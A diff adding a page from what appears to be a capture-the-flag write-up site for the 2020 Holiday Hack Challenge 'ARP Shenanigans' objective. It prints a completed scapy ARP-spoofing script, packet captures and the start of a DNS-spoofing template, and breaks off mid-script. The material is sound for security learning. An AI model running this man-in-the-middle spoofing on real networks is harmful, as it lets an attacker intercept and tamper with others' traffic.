@@ -1,0 +1,1280 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>9) ARP Shenanigans - KringleCon HHC2020 🎅</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.75751829.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ff6e42">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="deep-orange" data-md-color-accent="">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#9-arp-shenanigans" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../.." title="KringleCon HHC2020 🎅" class="md-header-nav__button md-logo" aria-label="KringleCon HHC2020 🎅">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            KringleCon HHC2020 🎅
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              9) ARP Shenanigans
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="KringleCon HHC2020 🎅" class="md-nav__button md-logo" aria-label="KringleCon HHC2020 🎅">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    KringleCon HHC2020 🎅
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../.." class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Objectives
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Objectives" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        Objectives
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../objective1/" class="md-nav__link">
+      1) Uncover Santa's Gift List
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../objective2/" class="md-nav__link">
+      2) Investigate S3 Bucket
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../objective3/" class="md-nav__link">
+      3) Point-of-Sale Password Recovery
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../objective4/" class="md-nav__link">
+      4) Operate the Santavator
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../objective5/" class="md-nav__link">
+      5) Open HID Lock
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../objective6/" class="md-nav__link">
+      6) Splunk Challenge
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../objective7/" class="md-nav__link">
+      7) Solve the Sleigh's CAN-D-BUS Problem
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../objective8/" class="md-nav__link">
+      8) Broken Tag Generator
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        9) ARP Shenanigans
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      9) ARP Shenanigans
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#the-objective" class="md-nav__link">
+    The Objective
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chat-with-alabaster-snowball" class="md-nav__link">
+    Chat with Alabaster Snowball
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hints-courtesy-alabaster-snowball" class="md-nav__link">
+    Hints Courtesy Alabaster Snowball
+  </a>
+  
+    <nav class="md-nav" aria-label="Hints Courtesy Alabaster Snowball">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sniffy" class="md-nav__link">
+    Sniffy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#spoofy" class="md-nav__link">
+    Spoofy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resolvy" class="md-nav__link">
+    Resolvy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embedy" class="md-nav__link">
+    Embedy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sniff" class="md-nav__link">
+    Sniff
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rejoice" class="md-nav__link">
+    Rejoice
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../objective10/" class="md-nav__link">
+      10) Defeat Fingerprint Sensor
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../objective11a/" class="md-nav__link">
+      11a) Naughty/Nice List with Blockchain Investigation Part 1
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../objective11b/" class="md-nav__link">
+      11b) Naughty/Nice List with Blockchain Investigation Part 2
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" data-md-state="indeterminate" type="checkbox" id="nav-3" checked>
+    
+    <label class="md-nav__link" for="nav-3">
+      Terminals
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Terminals" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        Terminals
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../terminals/terminal1/" class="md-nav__link">
+      Kringle Kiosk
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../terminals/terminal2/" class="md-nav__link">
+      Linux Primer
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../terminals/terminal3/" class="md-nav__link">
+      Unescape Tmux
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../terminals/terminal4/" class="md-nav__link">
+      Speaker Door Open
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../terminals/terminal5/" class="md-nav__link">
+      Speaker Lights On
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../terminals/terminal6/" class="md-nav__link">
+      Speaker Vending Machine On
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../terminals/terminal7/" class="md-nav__link">
+      Regex Toy Sorting
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../terminals/terminal8/" class="md-nav__link">
+      CAN-Bus Investigation
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../terminals/terminal12/" class="md-nav__link">
+      Snowball Game
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#the-objective" class="md-nav__link">
+    The Objective
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chat-with-alabaster-snowball" class="md-nav__link">
+    Chat with Alabaster Snowball
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hints-courtesy-alabaster-snowball" class="md-nav__link">
+    Hints Courtesy Alabaster Snowball
+  </a>
+  
+    <nav class="md-nav" aria-label="Hints Courtesy Alabaster Snowball">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sniffy" class="md-nav__link">
+    Sniffy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#spoofy" class="md-nav__link">
+    Spoofy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resolvy" class="md-nav__link">
+    Resolvy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embedy" class="md-nav__link">
+    Embedy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sniff" class="md-nav__link">
+    Sniff
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rejoice" class="md-nav__link">
+    Rejoice
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="9-arp-shenanigans">9) ARP Shenanigans</h1>
+<blockquote>
+<p>difficulty 🎄🎄🎄🎄</p>
+</blockquote>
+<h2 id="the-objective">The Objective</h2>
+<blockquote>
+<p>Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?</p>
+</blockquote>
+<h2 id="chat-with-alabaster-snowball">Chat with Alabaster Snowball</h2>
+<p>After helping Alabaster Snowball with the Scapy Practice challenge the following conversation ensues.</p>
+<blockquote>
+<p>Oh, I see the Scapy Present Packet Prepper has already been completed!</p>
+<p>Now you can help me get access to this machine.</p>
+<p>It seems that some interloper here at the North Pole has taken control of the host.</p>
+<p>We need to regain access to some important documents associated with Kringle Castle.</p>
+<p>Maybe we should try a machine-in-the-middle attack?</p>
+<p>That could give us access to manipulate DNS responses.</p>
+<p>But we'll still need to cook up something to change the HTTP response.</p>
+<p>I'm sure glad you're here Santa.</p>
+</blockquote>
+<h2 id="hints-courtesy-alabaster-snowball">Hints Courtesy Alabaster Snowball</h2>
+<h3 id="sniffy">Sniffy</h3>
+<blockquote>
+<p>Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host.</p>
+</blockquote>
+<h3 id="spoofy">Spoofy</h3>
+<blockquote>
+<p>The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts.</p>
+</blockquote>
+<h3 id="resolvy">Resolvy</h3>
+<blockquote>
+<p>Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP.</p>
+</blockquote>
+<h3 id="embedy">Embedy</h3>
+<blockquote>
+<p>The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a <a href="http://www.wannescolman.be/?p=98">customized .deb file</a></p>
+</blockquote>
+<h3 id="sniff">Sniff</h3>
+<p>let's sniff the eth0 interface using tcpdump. We see ARP traffic from host 10.6.6.35. The IP address of our host is 10.6.0.3 but perphaps we can pretend to be 10.6.6.53?</p>
+<pre><code class="language-bash">guest@e41e2320b206:~$ tcpdump -nni eth0
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+17:17:20.208002 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+17:17:21.243912 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+17:17:21.827077 IP6 fe80::f045:66ff:fe35:fcee &gt; ff02::2: ICMP6, router solicitation, length 16
+17:17:22.275888 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+17:17:23.315873 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+17:17:24.347884 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
+^C
+6 packets captured
+6 packets received by filter
+0 packets dropped by kernel
+guest@e41e2320b206:~$ ifconfig
+eth0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500
+        inet 10.6.0.3  netmask 255.255.0.0  broadcast 10.6.255.255
+        ether 02:42:0a:06:00:03  txqueuelen 0  (Ethernet)
+        RX packets 61  bytes 2910 (2.9 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre>
+<p>We can carry out an ARP spoof attack with the help of <code>/home/guest/scripts/arp_resp.py</code>.</p>
+<pre><code class="language-bash">guest@e41e2320b206:~/scripts$ cat arp_resp.py 
+#!/usr/bin/python3
+from scapy.all import *
+import netifaces as ni
+import uuid
+# Our eth0 ip
+ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+# Our eth0 mac address
+macaddr = ':'.join(['{:02x}'.format((uuid.getnode() &gt;&gt; i) &amp; 0xff) for i in range(0,8*6,8)][::-1])
+def handle_arp_packets(packet):
+    # if arp request, then we need to fill this out to send back our mac as the response
+    if ARP in packet and packet[ARP].op == 1:
+        ether_resp = Ether(dst=&quot;SOMEMACHERE&quot;, type=0x806, src=&quot;SOMEMACHERE&quot;)
+        arp_response = ARP(pdst=&quot;SOMEMACHERE&quot;)
+        arp_response.op = 99999
+        arp_response.plen = 99999
+        arp_response.hwlen = 99999
+        arp_response.ptype = 99999
+        arp_response.hwtype = 99999
+        arp_response.hwsrc = &quot;SOMEVALUEHERE&quot;
+        arp_response.psrc = &quot;SOMEVALUEHERE&quot;
+        arp_response.hwdst = &quot;SOMEVALUEHERE&quot;
+        arp_response.pdst = &quot;SOMEVALUEHERE&quot;
+        response = ether_resp/arp_response
+        sendp(response, iface=&quot;eth0&quot;)
+def main():
+    # We only want arp requests
+    berkeley_packet_filter = &quot;(arp[6:2] = 1)&quot;
+    # sniffing for one packet that will be sent to a function, while storing none
+    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>Let's analyse the ARP packets sent by 10.6.6.35 using scapy and modify the script accordingly.</p>
+<pre><code>guest@e41e2320b206:~$ tcpdump -nni eth0 -w sniff.pcap                                  
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes     
+^C3 packets captured                                                                   
+4 packets received by filter                                                           
+0 packets dropped by kernel                                                            
+guest@e41e2320b206:~$ which scapy                                                      
+/usr/local/bin/scapy                                                                   
+guest@e41e2320b206:~$ /usr/local/bin/scapy                         
+INFO: Can't import matplotlib. Won't be able to plot.
+INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().                    
+INFO: No IPv6 support in kernel
+INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
+INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
+WARNING: IPython not available. Using standard Python shell instead.
+AutoCompletion, History are disabled.
+
+                     aSPY//YASa       
+             apyyyyCY//////////YCa       |
+            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
+ ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4
+ AYAsAYYYYYYYY///Ps              cY//S   |
+         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
+         SPPPP///a          pP///AC//Y   |
+              A//A            cyP////C   | Have fun!
+              p///Ac            sC///a   |
+              P////YCpc           A//A   | Craft packets like I craft my beer.
+       scccccp///pSP///p          p//Y   |               -- Jean De Clerck
+      sY/////////y  caa           S//P   |
+       cayCyayP//Ya              pY/Ya
+        sY/PsY////YCc          aC//Yp 
+         sc  sccaCY//PCypaapyCP//YSs  
+                  spCPY//////YPSps    
+                       ccaacs         
+
+&gt;&gt;&gt; PACKETS = rdpcap(&quot;/home/guest/sniff.pcap&quot;)
+&gt;&gt;&gt; PACKETS.show()                         
+0000 Ether / ARP who has 10.6.6.53 says 10.6.6.35
+0001 Ether / ARP who has 10.6.6.53 says 10.6.6.35
+0002 Ether / ARP who has 10.6.6.53 says 10.6.6.35
+&gt;&gt;&gt; PACKETS[0]                             
+&lt;Ether  dst=ff:ff:ff:ff:ff:ff src=4c:24:57:ab:ed:84 type=ARP |&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 hwdst=00:00:00:00:00
+:00 pdst=10.6.6.53 |&gt;&gt;                     
+</code></pre>
+<p>the modifications are as follows</p>
+<p><img alt="arpchanges" src="../../images/obj9/arp_changes.PNG" /></p>
+<p>The modified script is as follows</p>
+<pre><code>#!/usr/bin/python3
+from scapy.all import *
+import netifaces as ni
+import uuid
+# Our eth0 ip
+ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+# Our eth0 mac address
+macaddr = ':'.join(['{:02x}'.format((uuid.getnode() &gt;&gt; i) &amp; 0xff) for i in range(0,8*6,8)][::-1])
+def handle_arp_packets(packet):
+    # if arp request, then we need to fill this out to send back our mac as the response
+    if ARP in packet and packet[ARP].op == 1:
+        ether_resp = Ether(dst=&quot;4c:24:57:ab:ed:84&quot;, type=0x806, src=macaddr)
+        arp_response = ARP(pdst=&quot;10.6.6.35&quot;)
+        arp_response.op = 2
+        arp_response.plen = 4
+        arp_response.hwlen = 6
+        arp_response.ptype = &quot;IPv4&quot;
+        arp_response.hwtype = 1
+        arp_response.hwsrc = macaddr
+        arp_response.psrc = &quot;10.6.6.53&quot;
+        arp_response.hwdst = &quot;4c:24:57:ab:ed:84&quot;
+        arp_response.pdst = &quot;10.6.6.35&quot;
+        response = ether_resp/arp_response
+        sendp(response, iface=&quot;eth0&quot;)
+def main():
+    # We only want arp requests
+    berkeley_packet_filter = &quot;(arp[6:2] = 1)&quot;
+    # sniffing for one packet that will be sent to a function, while storing none
+    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=0)
+if __name__ == &quot;__main__&quot;:
+    main()
+
+</code></pre>
+<p>Let's run our modified script and sniff packets on eth0 again to check if our ARP spoof worked.</p>
+<pre><code>guest@e41e2320b206:~$ tcpdump -nni eth0 -w arp_spoof.pcap                              
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes     
+^C9 packets captured                                                                   
+12 packets received by filter                                                          
+0 packets dropped by kernel                                                      
+</code></pre>
+<p>Opening up <code>arp_spoof.pcap</code> with scapy we see that our ARP spoof worked and we are getting DNS packets now.</p>
+<pre><code>guest@e41e2320b206:~$ /usr/local/bin/scapy
+INFO: Can't import matplotlib. Won't be able to plot.
+INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
+INFO: No IPv6 support in kernel
+INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
+INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
+WARNING: IPython not available. Using standard Python shell instead.
+AutoCompletion, History are disabled.
+
+                     aSPY//YASa       
+             apyyyyCY//////////YCa       |
+            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
+ ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4
+ AYAsAYYYYYYYY///Ps              cY//S   |
+         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
+         SPPPP///a          pP///AC//Y   |
+              A//A            cyP////C   | Have fun!
+              p///Ac            sC///a   |
+              P////YCpc           A//A   | Craft packets like it is your last
+       scccccp///pSP///p          p//Y   | day on earth.
+      sY/////////y  caa           S//P   |                      -- Lao-Tze
+       cayCyayP//Ya              pY/Ya   |
+        sY/PsY////YCc          aC//Yp 
+         sc  sccaCY//PCypaapyCP//YSs  
+                  spCPY//////YPSps    
+                       ccaacs         
+
+&gt;&gt;&gt; PACKETS = rdpcap(&quot;/home/guest/arp_spoof.pcap&quot;)
+&gt;&gt;&gt; PACKETS.show()
+0000 Ether / ARP who has 10.6.6.53 says 10.6.6.35
+0001 Ether / ARP is at 02:42:0a:06:00:03 says 10.6.6.53
+0002 Ether / IP / UDP / DNS Qry &quot;b'ftp.osuosl.org.'&quot; 
+0003 Ether / ARP who has 10.6.6.53 says 10.6.6.35
+0004 Ether / ARP is at 02:42:0a:06:00:03 says 10.6.6.53
+0005 Ether / IP / UDP / DNS Qry &quot;b'ftp.osuosl.org.'&quot; 
+0006 Ether / ARP who has 10.6.6.53 says 10.6.6.35
+0007 Ether / ARP is at 02:42:0a:06:00:03 says 10.6.6.53
+0008 Ether / IP / UDP / DNS Qry &quot;b'ftp.osuosl.org.'&quot; 
+
+&gt;&gt;&gt; PACKETS[2]
+&lt;Ether  dst=02:42:0a:06:00:03 src=4c:24:57:ab:ed:84 type=IPv4 |&lt;IP  version=4 ihl=5 tos=0x0 len=60 id=1 flags= frag=0 ttl=64 proto=udp chksum=0x5a4d src=10.6.6.35 dst=10.6.6.5
+3 |&lt;UDP  sport=38919 dport=domain len=40 chksum=0xa256 |&lt;DNS  id=0 qr=0 opcode=QUERY aa=0 tc=0 rd=1 ra=0 z=0 ad=0 cd=0 rcode=ok qdcount=1 ancount=0 nscount=0 arcount=0 qd=&lt;DNS
+QR  qname='ftp.osuosl.org.' qtype=A qclass=IN |&gt; an=None ns=None ar=None |&gt;&gt;&gt;&gt;
+</code></pre>
+<p>Looks like the host is trying to resolve the domain ftp.osuosl.org. We can play the role of the resolver here by way of a DNS spoof attack and supply a DNS response containing a mapping of ftp.osuosl.org to any IP of our choice. We will choose to map ftp.osuos1.org to our own IP address <code>10.6.0.3</code>.
+We can carry out an ARP spoof attack with the help of the script <code>/home/guest/scripts/dns_resp.py</code>.</p>
+<pre><code>guest@e41e2320b206:~/scripts$ cat dns_resp.py 
+#!/usr/bin/python3
+from scapy.all import *
+import netifaces as ni
+import uuid
+# Our eth0 IP
+ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+# Our Mac Addr
+macaddr = ':'.join(['{:02x}'.format((uuid.getnode() &gt;&gt; i) &amp; 0xff) for i in range(0,8*6,8)][::-1])
+# destination ip we arp spoofed
+ipaddr_we_arp_spoofed = &quot;10.6.1.10&quot;
+def handle_dns_request(packet):
+    # Need to change mac addresses, Ip Addresses, and ports below.
+    # We also need
+    eth = Ether(src=&quot;00:00:00:00:00:00&quot;, dst=&quot;00:00:00:00:00:00&quot;)   # need to replace mac addresses
+    ip  = IP(dst=&quot;0.0.0.0&quot;, src=&quot;0.0.0.0&quot;)                          # need to replace IP addresses
+    udp = UDP(dport=99999, sport=99999)                             # need to replace ports
+    dns = DNS(
+        # MISSING DNS RESPONSE LAYER VALUES 
+    )
+    dns_response = eth / ip / udp / dns
+    sendp(dns_response, iface=&quot;eth0&quot;)
+def main():
+    berkeley_packet_filter = &quot; and &quot;.join( [
+        &quot;udp dst port 53&quot;,                              # dns
+        &quot;udp[10] &amp; 0x80 = 0&quot;,                           # dns request
+        &quot;dst host {}&quot;.format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
+        &quot;ether dst host {}&quot;.format(macaddr)             # our macaddress since we spoofed the ip to our mac
+    ] )
+    # sniff the eth0 int without storing packets in memory and stopping after one dns request
